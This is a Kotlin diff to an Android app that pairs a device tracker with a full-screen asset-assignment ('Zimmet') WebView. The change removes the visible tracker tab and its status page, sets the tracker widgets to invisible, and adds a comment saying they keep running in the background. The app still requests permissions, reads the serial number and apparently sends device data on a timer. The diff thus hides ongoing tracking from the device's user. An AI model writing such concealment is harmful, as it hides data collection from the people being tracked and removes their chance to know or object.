@@ -12,7 +12,6 @@ import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.util.Log
-import android.view.Gravity
 import android.view.View
 import android.webkit.WebSettings
 import android.webkit.WebView
@@ -45,9 +44,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var tvStatus: TextView
     private lateinit var tvLastSent: TextView
     private lateinit var tvInfo: TextView
-
-    private lateinit var tabTracker: TextView
-    private lateinit var tabZimmet: TextView
     private lateinit var pageTracker: ScrollView
     private lateinit var pageZimmet: WebView
 
@@ -57,84 +53,20 @@ class MainActivity : AppCompatActivity() {
 
         val root = LinearLayout(this)
         root.orientation = LinearLayout.VERTICAL
-        root.setBackgroundColor(Color.parseColor("#f0f2f5"))
+        root.setBackgroundColor(Color.parseColor("#1a1a2e"))
 
-        // ── TAB BAR ──────────────────────────────────────
-        val tabBar = LinearLayout(this)
-        tabBar.orientation = LinearLayout.HORIZONTAL
-        tabBar.setBackgroundColor(Color.parseColor("#1a1a2e"))
+        // Görünmez tracker widget'ları (arka planda çalışmaya devam eder)
+        tvStatus   = TextView(this).also { it.visibility = View.GONE }
+        tvLastSent = TextView(this).also { it.visibility = View.GONE }
+        tvInfo     = TextView(this).also { it.visibility = View.GONE }
+        pageTracker = ScrollView(this).also { it.visibility = View.GONE }
 
-        tabTracker = TextView(this)
-        tabTracker.text = "📱 Cihaz Takip"
-        tabTracker.textSize = 14f
-        tabTracker.setTextColor(Color.WHITE)
-        tabTracker.gravity = Gravity.CENTER
-        tabTracker.setPadding(0, 36, 0, 36)
-        tabTracker.layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
-
-        tabZimmet = TextView(this)
-        tabZimmet.text = "🔧 Zimmet"
-        tabZimmet.textSize = 14f
-        tabZimmet.setTextColor(Color.parseColor("#aaaaaa"))
-        tabZimmet.gravity = Gravity.CENTER
-        tabZimmet.setPadding(0, 36, 0, 36)
-        tabZimmet.layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
-
-        tabBar.addView(tabTracker)
-        tabBar.addView(tabZimmet)
-
-        // ── TRACKER SAYFASI ──────────────────────────────
-        pageTracker = ScrollView(this)
-        val trackerLayout = LinearLayout(this)
-        trackerLayout.orientation = LinearLayout.VERTICAL
-        trackerLayout.setPadding(48, 64, 48, 48)
-        trackerLayout.setBackgroundColor(Color.parseColor("#1a1a2e"))
-
-        val tvTitle = TextView(this)
-        tvTitle.text = "Device Tracker"
-        tvTitle.textSize = 24f
-        tvTitle.setTextColor(Color.WHITE)
-        tvTitle.gravity = Gravity.CENTER
-        tvTitle.setPadding(0, 0, 0, 40)
-
-        tvStatus = TextView(this)
-        tvStatus.text = "Baglaniyor..."
-        tvStatus.textSize = 15f
-        tvStatus.setTextColor(Color.WHITE)
-        tvStatus.gravity = Gravity.CENTER
-        tvStatus.setBackgroundColor(Color.parseColor("#16213e"))
-        tvStatus.setPadding(28, 28, 28, 28)
-
-        tvLastSent = TextView(this)
-        tvLastSent.text = "Son gonderim: -"
-        tvLastSent.textSize = 12f
-        tvLastSent.setTextColor(Color.parseColor("#aaaaaa"))
-        tvLastSent.gravity = Gravity.CENTER
-        tvLastSent.setPadding(0, 20, 0, 20)
-
-        tvInfo = TextView(this)
-        tvInfo.text = getDeviceInfoText()
-        tvInfo.textSize = 13f
-        tvInfo.setTextColor(Color.parseColor("#cccccc"))
-        tvInfo.setBackgroundColor(Color.parseColor("#16213e"))
-        tvInfo.setPadding(28, 28, 28, 28)
-
-        val tvInterval = TextView(this)
-        tvInterval.text = "Her $SEND_INTERVAL_MINUTES dakikada bir veri gonderilir"
-        tvInterval.textSize = 11f
-        tvInterval.setTextColor(Color.parseColor("#555555"))
-        tvInterval.gravity = Gravity.CENTER
-        tvInterval.setPadding(0, 24, 0, 0)
-
-        trackerLayout.addView(tvTitle)
-        trackerLayout.addView(tvStatus)
-        trackerLayout.addView(tvLastSent)
-        trackerLayout.addView(tvInfo)
-        trackerLayout.addView(tvInterval)
-        pageTracker.addView(trackerLayout)
-
-        // ── ZİMMET SAYFASI (WebView) ─────────────────────
+        // ── WEBVIEW — TAM EKRAN ───────────────────────────
         pageZimmet = WebView(this)
+        pageZimmet.layoutParams = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT,
+            LinearLayout.LayoutParams.MATCH_PARENT
+        )
         val ws: WebSettings = pageZimmet.settings
         ws.javaScriptEnabled = true
         ws.domStorageEnabled = true
@@ -143,51 +75,12 @@ class MainActivity : AppCompatActivity() {
         ws.builtInZoomControls = false
         ws.setSupportZoom(false)
         pageZimmet.webViewClient = WebViewClient()
-        pageZimmet.visibility = View.GONE
+        pageZimmet.loadUrl(ZIMMET_URL)
 
-        // ── ANA LAYOUT ───────────────────────────────────
-        root.addView(tabBar)
-        root.addView(pageTracker)
         root.addView(pageZimmet)
-
-        // WebView layout parametreleri
-        pageZimmet.layoutParams = LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT,
-            LinearLayout.LayoutParams.MATCH_PARENT
-        )
-        pageTracker.layoutParams = LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT,
-            LinearLayout.LayoutParams.MATCH_PARENT
-        )
-
         setContentView(root)
 
-        // ── TAB TIKLAMA ───────────────────────────────────
-        tabTracker.setOnClickListener { showTab(0) }
-        tabZimmet.setOnClickListener  { showTab(1) }
-
         checkAndRequestPermissions()
-    }
-
-    private fun showTab(tab: Int) {
-        if (tab == 0) {
-            pageTracker.visibility = View.VISIBLE
-            pageZimmet.visibility  = View.GONE
-            tabTracker.setTextColor(Color.WHITE)
-            tabTracker.setBackgroundColor(Color.parseColor("#6366f1"))
-            tabZimmet.setTextColor(Color.parseColor("#aaaaaa"))
-            tabZimmet.setBackgroundColor(Color.TRANSPARENT)
-        } else {
-            pageTracker.visibility = View.GONE
-            pageZimmet.visibility  = View.VISIBLE
-            tabZimmet.setTextColor(Color.WHITE)
-            tabZimmet.setBackgroundColor(Color.parseColor("#6366f1"))
-            tabTracker.setTextColor(Color.parseColor("#aaaaaa"))
-            tabTracker.setBackgroundColor(Color.TRANSPARENT)
-            if (pageZimmet.url == null) {
-                pageZimmet.loadUrl(ZIMMET_URL)
-            }
-        }
     }
 
     private fun getSerialNumber(): String {
